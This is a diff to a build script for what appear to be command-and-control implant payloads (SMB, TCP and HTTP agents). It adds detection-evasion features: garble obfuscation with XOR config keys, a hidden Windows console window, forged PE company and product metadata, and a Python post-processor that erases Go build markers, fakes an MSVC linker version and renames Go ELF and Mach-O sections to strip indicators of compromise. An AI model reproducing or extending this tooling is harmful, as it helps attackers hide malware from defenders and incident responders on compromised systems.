@@ -258,15 +258,46 @@ build_binary() {
         fi
     fi
 
+    # Windows GUI subsystem (hides console window)
+    WINDOWS_SUBSYSTEM_FLAG=""
+    if [ "${os}" = "windows" ]; then
+        WINDOWS_SUBSYSTEM_FLAG="-H windowsgui"
+    fi
+
     # Run garble build with all flags including safety checks
     cd /app
 
+    # Generate PE version info resource for Windows (only if operator specified fields)
+    if [ "${os}" = "windows" ] && [ -n "${PE_FILE_DESCRIPTION}${PE_COMPANY_NAME}${PE_PRODUCT_NAME}${PE_FILE_VERSION}" ]; then
+        cat > /tmp/gen_winres.py << 'PYEOF'
+import json, os
+d = {"RT_VERSION":{"#1":{"0000":{"fixed":{
+    "file_version": os.environ.get("PE_FILE_VERSION", "1.0.0.0"),
+    "product_version": os.environ.get("PE_PRODUCT_VERSION", "1.0.0.0")},
+    "info":{"0409":{
+    "FileDescription": os.environ.get("PE_FILE_DESCRIPTION", ""),
+    "FileVersion": os.environ.get("PE_FILE_VERSION", "1.0.0.0"),
+    "ProductVersion": os.environ.get("PE_PRODUCT_VERSION", "1.0.0.0"),
+    "CompanyName": os.environ.get("PE_COMPANY_NAME", ""),
+    "ProductName": os.environ.get("PE_PRODUCT_NAME", "")
+}}}}}}
+with open("/tmp/winres.json", "w") as f:
+    json.dump(d, f)
+PYEOF
+        python3 /tmp/gen_winres.py
+        go-winres make --arch "${arch}" --in /tmp/winres.json --out /app/rsrc 2>&1 && \
+            echo "[+] Generated PE version info" || \
+            echo "[!] PE version info skipped"
+    elif [ "${os}" = "windows" ]; then
+        echo "[*] No PE version info requested (default: no resource section)"
+    fi
+
     # Use different ldflags for SMB, TCP, and HTTP payloads
     if [ "${PAYLOAD_TYPE}" = "smb" ]; then
-        # SMB payload - uses xorKey for runtime decryption (same security as HTTPS)
+        # SMB payload - uses config key for runtime decryption
         GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
-            -ldflags "-w -s -buildid= \
-            -X 'main.xorKey=${XOR_KEY}' \
+            -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
+            -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
             -X 'main.sleep=${SLEEP}' \
             -X 'main.jitter=${JITTER}' \
@@ -331,10 +362,10 @@ build_binary() {
             ${SAFETY_FLAGS}" \
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     elif [ "${PAYLOAD_TYPE}" = "tcp" ]; then
-        # TCP payload - uses xorKey for runtime decryption, similar to SMB
+        # TCP payload - uses config key for runtime decryption
         GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
-            -ldflags "-w -s -buildid= \
-            -X 'main.xorKey=${XOR_KEY}' \
+            -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
+            -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
             -X 'main.sleep=${SLEEP}' \
             -X 'main.jitter=${JITTER}' \
@@ -400,8 +431,8 @@ build_binary() {
     else
         # HTTP payload - full ldflags
         GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny build \
-            -ldflags "-w -s -buildid= \
-            -X 'main.xorKey=${XOR_KEY}' \
+            -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
+            -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
             -X 'main.sleep=${SLEEP}' \
             -X 'main.jitter=${JITTER}' \
@@ -497,6 +528,124 @@ build_binary() {
     fi
 
     echo "Binary successfully built: /output/${OUTPUT_FILENAME}"
+
+    # Post-build processing to strip IOC markers
+    echo "[*] Running post-build processing..."
+
+    # NOTE: objcopy --remove-section corrupts Go static binaries
+    # All ELF modifications done in-place via Python postprocess below
+
+    # All platforms: patch binary-level markers
+    cat > /tmp/postprocess.py << 'PYEOF'
+import sys, struct
+
+def main():
+    filename = sys.argv[1]
+    os_type = sys.argv[2]
+
+    with open(filename, 'r+b') as f:
+        data = bytearray(f.read())
+        modified = False
+
+        # Zero Go buildinf magic marker
+        marker = b'\xff Go buildinf:'
+        idx = data.find(marker)
+        while idx != -1:
+            for i in range(len(marker)):
+                data[idx + i] = 0x00
+            modified = True
+            idx = data.find(marker, idx + len(marker))
+
+        # Zero go:fipsinfo marker
+        fips = b'go:fipsinfo'
+        idx = data.find(fips)
+        while idx != -1:
+            for i in range(len(fips)):
+                data[idx + i] = 0x00
+            modified = True
+            idx = data.find(fips, idx + len(fips))
+
+        # Windows: patch PE linker version (Go 3.0 -> MSVC 14.16)
+        if os_type == 'windows' and data[:2] == b'MZ':
+            pe_offset = struct.unpack_from('<I', data, 0x3C)[0]
+            if pe_offset < len(data) - 4 and data[pe_offset:pe_offset+4] == b'PE\x00\x00':
+                opt_offset = pe_offset + 24
+                if opt_offset + 4 <= len(data):
+                    major = data[opt_offset + 2]
+                    minor = data[opt_offset + 3]
+                    if major == 3 and minor == 0:
+                        data[opt_offset + 2] = 14
+                        data[opt_offset + 3] = 16
+                        modified = True
+
+        # Linux: rename Go-specific ELF section names and zero section contents
+        if os_type == 'linux' and data[:4] == b'\x7fELF':
+            ei_class = data[4]
+            if ei_class == 2:
+                e_shoff = struct.unpack_from('<Q', data, 40)[0]
+                e_shentsize = struct.unpack_from('<H', data, 58)[0]
+                e_shnum = struct.unpack_from('<H', data, 60)[0]
+                e_shstrndx = struct.unpack_from('<H', data, 62)[0]
+
+                shstr_hdr = e_shoff + e_shstrndx * e_shentsize
+                shstr_off = struct.unpack_from('<Q', data, shstr_hdr + 24)[0]
+                shstr_sz = struct.unpack_from('<Q', data, shstr_hdr + 32)[0]
+
+                renames = {
+                    b'.gopclntab': b'.rodata1',
+                    b'.typelink': b'.tpdata',
+                    b'.itablink': b'.itdata',
+                    b'.go.buildinfo': b'.bldmeta',
+                    b'.go.fipsinfo': b'.certdata',
+                    b'.go.module': b'.moddata',
+                    b'.note.go.buildid': b'.note.bid',
+                    b'.note.gnu.build-id': b'.note.gid',
+                }
+
+                for i in range(e_shnum):
+                    sh = e_shoff + i * e_shentsize
+                    sh_name_off = struct.unpack_from('<I', data, sh)[0]
+                    name_abs = shstr_off + sh_name_off
+                    if name_abs >= len(data):
+                        continue
+                    end = data.index(0, name_abs) if 0 in data[name_abs:name_abs+64] else name_abs+64
+                    sec_name = bytes(data[name_abs:end])
+
+                    if sec_name in renames:
+                        new = renames[sec_name]
+                        for j in range(len(sec_name)):
+                            data[name_abs + j] = new[j] if j < len(new) else 0
+                        modified = True
+
+        # Darwin: rename Go-specific Mach-O section names
+        if os_type == 'darwin':
+            renames = [
+                (b'__gopclntab',    b'__rodata1'),
+                (b'__go_buildinfo', b'__bldmeta'),
+                (b'__go_fipsinfo',  b'__certdata'),
+                (b'__go_module',    b'__moddata'),
+                (b'__typelink',     b'__tpdata'),
+                (b'__itablink',     b'__itdata'),
+            ]
+            for old_name, new_name in renames:
+                idx = data.find(old_name)
+                while idx != -1:
+                    for i in range(len(old_name)):
+                        data[idx + i] = new_name[i] if i < len(new_name) else 0
+                    modified = True
+                    idx = data.find(old_name, idx + len(old_name))
+
+        if modified:
+            f.seek(0)
+            f.write(data)
+            f.truncate()
+
+if __name__ == '__main__':
+    main()
+PYEOF
+    python3 /tmp/postprocess.py "/output/${OUTPUT_FILENAME}" "${os}" && \
+        echo "[+] Binary markers patched" || \
+        echo "[!] Binary marker patching skipped"
 }
 
 # Build handlers for each OS
